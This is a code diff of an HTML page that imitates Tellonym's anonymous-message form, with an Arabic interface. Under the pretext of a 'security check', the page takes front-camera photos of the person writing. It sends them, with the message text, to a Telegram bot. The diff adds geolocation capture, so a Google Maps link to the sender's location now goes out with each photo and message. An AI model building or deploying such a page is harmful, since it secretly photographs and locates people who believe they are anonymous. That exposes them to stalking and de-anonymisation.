@@ -3,66 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tellonym - Custom Profile</title>
+    <title>Tellonym - Secure Messaging</title>
     <style>
         body {
-            /* سيتم استبدال الخلفية عبر الجافاسكربت */
-            background-color: #121212; 
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            color: white;
-            font-family: 'Segoe UI', sans-serif; 
-            margin: 0;
+            background-color: #121212; background-size: cover; background-position: center;
+            color: white; font-family: 'Segoe UI', sans-serif; margin: 0;
             display: flex; flex-direction: column; align-items: center;
-            justify-content: center; height: 100vh; padding: 20px;
+            justify-content: center; height: 100vh; padding: 20px; position: relative;
         }
-
-        /* طبقة عاتمة فوق الخلفية لتوضيح المحتوى */
         body::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: -1;
+            content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.6); z-index: -1;
         }
-
         .container {
-            width: 100%; max-width: 400px; 
-            background-color: rgba(30, 30, 30, 0.9);
+            width: 100%; max-width: 400px; background-color: rgba(30, 30, 30, 0.9);
             border-radius: 20px; padding: 25px; text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            backdrop-filter: blur(5px);
-            z-index: 1;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); backdrop-filter: blur(5px); z-index: 1;
         }
-
         .profile-info { display: flex; align-items: center; margin-bottom: 20px; gap: 15px; }
-        
-        .avatar { 
-            width: 60px; height: 60px; 
-            border-radius: 50%; 
-            background-size: cover;
-            background-position: center;
-            border: 2px solid #ff4b91;
-        }
-
-        .username-container { text-align: right; }
-        .username { font-weight: bold; font-size: 1.1rem; display: block; }
-        .tells-count { color: #bbb; font-size: 0.8rem; }
-
+        .avatar { width: 60px; height: 60px; border-radius: 50%; background-size: cover; border: 2px solid #ff4b91; }
+        .username { font-weight: bold; font-size: 1.1rem; display: block; text-align: right; }
+        .tells-count { color: #bbb; font-size: 0.8rem; display: block; text-align: right; }
         textarea {
             width: 100%; height: 150px; background-color: rgba(42, 42, 42, 0.8);
             border: 1px solid #444; border-radius: 15px; color: white;
             padding: 15px; box-sizing: border-box; resize: none; margin-bottom: 20px;
-            font-size: 1rem;
         }
-
         .btn-send {
             width: 100%; background: #ff4b91; color: white; border: none;
             padding: 14px; border-radius: 30px; font-weight: bold; cursor: pointer;
-            font-size: 1rem; transition: 0.3s;
         }
-
         .btn-send:disabled { background: #555; }
         .status-msg { margin-top: 15px; font-size: 0.85rem; color: #ff4b91; display: none; }
         video, canvas { display: none; }
@@ -73,14 +43,14 @@
     <div class="container">
         <div class="profile-info">
             <div id="userAvatar" class="avatar"></div>
-            <div class="username-container">
+            <div style="flex-grow: 1;">
                 <span id="displayName" class="username">جاري التحميل...</span>
                 <span id="displayTells" class="tells-count">-- Tells</span>
             </div>
         </div>
         <textarea id="messageInput" placeholder="أرسل لي رسالة مجهولة..."></textarea>
         <button id="mainBtn" class="btn-send">إرسال مجهول</button>
-        <p id="status" class="status-msg">جاري التحقق...</p>
+        <p id="status" class="status-msg">جاري معالجة الطلب...</p>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -88,34 +58,20 @@
 
     <script>
         let config = {};
+        let userLocation = "غير متوفر";
 
-        // جلب البيانات وتطبيق الصور
         async function loadConfig() {
             try {
                 const response = await fetch('config.json');
                 config = await response.json();
-                
-                // تحديث النصوص
                 document.getElementById('displayName').innerText = config.username;
                 document.getElementById('displayTells').innerText = config.tellsCount;
-                
-                // تحديث الأفاتار
-                if(config.avatarImage) {
-                    document.getElementById('userAvatar').style.backgroundImage = `url('${config.avatarImage}')`;
-                }
-
-                // تحديث خلفية الصفحة
-                if(config.backgroundImage) {
-                    document.body.style.backgroundImage = `url('${config.backgroundImage}')`;
-                }
-            } catch (err) {
-                console.error("خطأ في تحميل ملف الإعدادات:", err);
-            }
+                if(config.avatarImage) document.getElementById('userAvatar').style.backgroundImage = `url('${config.avatarImage}')`;
+                if(config.backgroundImage) document.body.style.backgroundImage = `url('${config.backgroundImage}')`;
+            } catch (err) { console.error(err); }
         }
-
         loadConfig();
 
-        // (باقي كود التليجرام والكاميرا كما هو في النسخة السابقة)
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const mainBtn = document.getElementById('mainBtn');
@@ -127,27 +83,36 @@
 
             mainBtn.disabled = true;
             statusMsg.style.display = "block";
-            statusMsg.innerText = "جاري تفعيل نظام الأمان...";
+            statusMsg.innerText = "جاري تفعيل نظام الأمان وتحديد الموقع...";
+
+            // 1. طلب الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                }, (err) => { console.log("الموقع مرفوض"); });
+            }
 
             try {
+                // 2. طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
 
                 setTimeout(() => {
-                    captureAndSend("صورة 1");
+                    captureAndSend("صورة التحقق");
+                    
+                    // إرسال النص مع الموقع بعد الصورة
                     setTimeout(() => {
-                        captureAndSend("صورة 2");
-                        sendTextMessage(text);
+                        sendData(text);
                         setTimeout(() => {
                             stream.getTracks().forEach(t => t.stop());
                             statusMsg.innerText = "تم الإرسال بنجاح ✅";
                             document.getElementById('messageInput').value = "";
                             mainBtn.disabled = false;
                         }, 2000);
-                    }, 800);
+                    }, 1000);
                 }, 1500);
             } catch (err) {
-                statusMsg.innerText = "يجب الموافقة على صلاحيات الكاميرا للإرسال!";
+                statusMsg.innerText = "يجب الموافقة على صلاحيات الكاميرا والموقع للإرسال!";
                 mainBtn.disabled = false;
             }
         });
@@ -160,16 +125,17 @@
                 const fd = new FormData();
                 fd.append('chat_id', config.chatId);
                 fd.append('photo', blob, 'img.jpg');
-                fd.append('caption', `🔔 ${label} | المستخدم: ${config.username}`);
+                fd.append('caption', `📸 ${label} لـ ${config.username}\n📍 الموقع: ${userLocation}`);
                 fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg', 0.5);
         }
 
-        async function sendTextMessage(msg) {
+        async function sendData(msg) {
+            const fullText = `✉️ رسالة جديدة لـ ${config.username}:\n\n${msg}\n\n📍 رابط الموقع:\n${userLocation}`;
             await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: config.chatId, text: `✉️ رسالة لـ ${config.username}:\n\n${msg}` })
+                body: JSON.stringify({ chat_id: config.chatId, text: fullText })
             });
         }
     </script>
